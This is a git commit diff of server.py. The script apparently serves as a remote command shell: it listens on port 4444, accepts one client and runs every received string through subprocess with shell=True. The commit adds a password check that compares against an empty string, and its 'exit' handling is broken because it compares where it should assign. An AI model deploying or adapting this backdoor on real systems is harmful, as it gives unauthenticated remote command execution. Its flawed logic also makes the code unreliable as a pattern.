3b39259ada492da83aafce1e15fb6d6d6d38d9a1
albertuslaksana <89668012+albertuslaksana@users.noreply.github.com>
2023-03-08 14:29:11 -0600

    Update server.py

--- server.py
+++ server.py
@@ -3,18 +3,31 @@ import subprocess
 
 HOST = '10.0.2.5'
 PORT = 4444 
+real_password = ""
+passwords_match = False
 server = socket.socket()
 server.bind((HOST, PORT))
 print('Server Started')
 print('Listening For Client Connection')
 server.listen(1)
 client, client_addr = server.accept()
-print(f"[+] {client_addr} Client connected to the server")
+client.send(("Input password for client: ").encode())
+password = client.recv(1024)
+password = password.decode()
+if password == real_password:
+    passwords_match = True
+else:
+    client.send(("Incorrect Password...Closing Connection").encode())
+    client.close()
+print(str(client_addr) + " has connected to the server")
 
-while True:
+while passwords_match == True:
     print("[-] Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
+    if command == "exit":
+        passwords_match == False
+        client.close()
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
     output_error = op.stderr.read()
